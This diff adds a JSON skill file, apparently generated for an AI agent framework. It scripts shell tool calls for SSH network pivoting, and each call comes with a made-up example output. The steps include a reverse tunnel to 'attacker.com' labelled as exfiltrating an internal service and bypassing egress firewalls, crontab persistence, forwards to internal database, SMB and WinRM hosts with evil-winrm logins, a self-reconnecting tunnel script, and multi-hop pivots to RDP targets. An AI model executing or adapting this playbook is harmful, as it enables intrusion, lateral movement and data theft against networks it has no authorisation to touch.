@@ -1,0 +1,38 @@
+{
+  "name": "ssh_tunneling_port_forward",
+  "description": "SSH tunneling and port forwarding for network pivoting",
+  "pattern": "ssh.*tunnel|port.*forward|ssh.*-L|ssh.*-R|ssh.*-D",
+  "parameters": ["pivot_host", "target_network", "local_port", "remote_port"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "ssh", "args": ["-L", "8080:192.168.10.50:80", "user@10.10.10.100", "-N", "-f"]},
+      "expected_output": {"type": "string", "example": "Local port forward established:\n  Local: 127.0.0.1:8080\n  Remote: 192.168.10.50:80\n  Pivot: user@10.10.10.100\n\nSSH tunnel running in background (PID: 12345)\n\nAccess the remote service:\n  curl http://127.0.0.1:8080\n  firefox http://127.0.0.1:8080\n\nTunnel details:\n  Type: Local port forward (-L)\n  Protocol: TCP over SSH\n  Encrypted: Yes\n  Background mode: -N -f flags\n\nVerify tunnel:\n  netstat -tlnp | grep 8080\n  ps aux | grep 'ssh -L'"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "ssh", "args": ["-R", "9090:127.0.0.1:80", "user@attacker.com", "-N", "-f"]},
+      "expected_output": {"type": "string", "example": "Reverse port forward established:\n  Remote: attacker.com:9090\n  Local: 127.0.0.1:80\n  Direction: Internal server -> Attacker\n\nSSH tunnel active (PID: 12346)\n\nUse case: Exfiltrate internal web service\n  From attacker: curl http://127.0.0.1:9090\n  Receives: Internal service on victim:80\n\nTunnel configuration:\n  Type: Reverse port forward (-R)\n  Bypasses: Firewall egress restrictions\n  Connection: Victim initiates, attacker receives\n\nPersistence:\n  Add to crontab: @reboot ssh -R 9090:127.0.0.1:80 user@attacker.com -N -f\n  Systemd service for auto-reconnect"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "ssh", "args": ["-D", "1080", "user@10.10.10.100", "-N", "-f"]},
+      "expected_output": {"type": "string", "example": "Dynamic SOCKS proxy established:\n  Local: 127.0.0.1:1080\n  Pivot: user@10.10.10.100\n  Type: SOCKS5 proxy\n\nSSH tunnel running (PID: 12347)\n\nConfigure applications:\n  export ALL_PROXY=socks5://127.0.0.1:1080\n  curl --proxy socks5://127.0.0.1:1080 http://192.168.10.50\n  proxychains nmap -sT 192.168.10.0/24\n\nBrowser configuration:\n  Firefox: Preferences > Network > SOCKS5 proxy\n  Host: 127.0.0.1, Port: 1080\n\nAdvantages:\n  - Access entire internal network through single tunnel\n  - No need for multiple -L forwards\n  - Works with any TCP application\n\nVerify:\n  netstat -tlnp | grep 1080\n  curl -x socks5://127.0.0.1:1080 http://internal.server"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "ssh -L 3306:db.internal.corp:3306 -L 445:dc.internal.corp:445 -L 5985:exchange.internal.corp:5985 user@pivot.dmz.corp -N -f && echo 'Multi-port forward active'"]},
+      "expected_output": {"type": "string", "example": "Multi-port forward active\n\nTunnels established:\n  1. Local 3306 -> db.internal.corp:3306 (MySQL)\n  2. Local 445 -> dc.internal.corp:445 (SMB)\n  3. Local 5985 -> exchange.internal.corp:5985 (WinRM)\n\nPivot host: user@pivot.dmz.corp\nSSH tunnel PID: 12348\n\nAccess internal services:\n  MySQL:  mysql -h 127.0.0.1 -P 3306 -u admin -p\n  SMB:    smbclient -L 127.0.0.1 -U administrator\n  WinRM:  evil-winrm -i 127.0.0.1 -u admin -p password\n\nNetwork topology:\n  Attacker (10.10.14.50)\n    |\n  DMZ Pivot (10.10.10.100 / 192.168.10.5)\n    |\n  Internal Network (192.168.10.0/24)\n    |-- db.internal.corp (192.168.10.20)\n    |-- dc.internal.corp (192.168.10.10)\n    |-- exchange.internal.corp (192.168.10.30)\n\nActive connections:\n  netstat -tlnp | grep -E '3306|445|5985'"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "ssh -J jumpuser@bastion.corp:22 user@internal.server.corp 'hostname && ip a'"]},
+      "expected_output": {"type": "string", "example": "internal.server.corp\n\nip a output:\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 192.168.10.50/24 brd 192.168.10.255 scope global eth0\n3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 10.0.20.10/24 brd 10.0.20.255 scope global eth1\n\nSSH Jump Host (ProxyJump):\n  First hop: jumpuser@bastion.corp:22\n  Second hop: user@internal.server.corp\n  Command executed: hostname && ip a\n\nNetwork path:\n  Attacker -> bastion.corp (public) -> internal.server.corp (private)\n\nAlternative syntax:\n  ssh -o ProxyJump=jumpuser@bastion.corp user@internal.server.corp\n\nSSH config (~/.ssh/config):\n  Host internal\n    HostName internal.server.corp\n    User user\n    ProxyJump jumpuser@bastion.corp\n\nUsage: ssh internal"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > tunnel.sh << 'EOF'\n#!/bin/bash\nwhile true; do\n  ssh -D 1080 -L 3389:win-dc:3389 -L 445:win-fs:445 user@pivot -N -o ServerAliveInterval=60 -o ExitOnForwardFailure=yes\n  echo \"[$(date)] Tunnel died, reconnecting in 5s...\"\n  sleep 5\ndone\nEOF\nchmod +x tunnel.sh && ./tunnel.sh &"]},
+      "expected_output": {"type": "string", "example": "Persistent SSH tunnel script created: tunnel.sh\n\nScript running in background (PID: 12349)\n\nFeatures:\n  - Auto-reconnect on failure\n  - Keep-alive packets (ServerAliveInterval=60)\n  - Exit on forward failure detection\n  - Infinite loop with 5s retry delay\n\nTunnels maintained:\n  SOCKS5: 127.0.0.1:1080 -> pivot network\n  RDP:    127.0.0.1:3389 -> win-dc:3389\n  SMB:    127.0.0.1:445  -> win-fs:445\n\nMonitor:\n  tail -f tunnel.log\n  ps aux | grep tunnel.sh\n\nSystemd service (production):\n  [Unit]\n  Description=Persistent SSH Tunnel\n  After=network.target\n  \n  [Service]\n  Type=simple\n  User=tunneluser\n  ExecStart=/path/to/tunnel.sh\n  Restart=always\n  \n  [Install]\n  WantedBy=multi-user.target\n\nKill tunnel:\n  pkill -f tunnel.sh\n  kill 12349"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "ssh -L 127.0.0.1:8888:192.168.10.100:22 user@10.10.10.50 -N -f && ssh -L 127.0.0.1:9999:172.16.5.10:3389 user@127.0.0.1 -p 8888 -N -f"]},
+      "expected_output": {"type": "string", "example": "Double SSH pivot established:\n\nFirst tunnel (PID: 12350):\n  Local: 127.0.0.1:8888\n  Remote: 192.168.10.100:22 (via 10.10.10.50)\n  Purpose: Access second pivot point\n\nSecond tunnel (PID: 12351):\n  Local: 127.0.0.1:9999\n  Remote: 172.16.5.10:3389 (via 192.168.10.100)\n  Purpose: Access final target RDP\n\nNetwork topology:\n  Attacker (10.10.14.50)\n    | SSH tunnel 1\n  Pivot 1 (10.10.10.50 / 192.168.10.5)\n    | SSH tunnel 2\n  Pivot 2 (192.168.10.100 / 172.16.5.1)\n    | Forwarded connection\n  Target (172.16.5.10:3389)\n\nAccess target:\n  rdesktop 127.0.0.1:9999\n  xfreerdp /v:127.0.0.1:9999 /u:admin\n\nMulti-hop pivoting:\n  Attacker -> DMZ -> Internal Subnet 1 -> Internal Subnet 2 -> Target\n\nActive tunnels:\n  netstat -tlnp | grep -E '8888|9999'\n  ps aux | grep 'ssh -L'"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
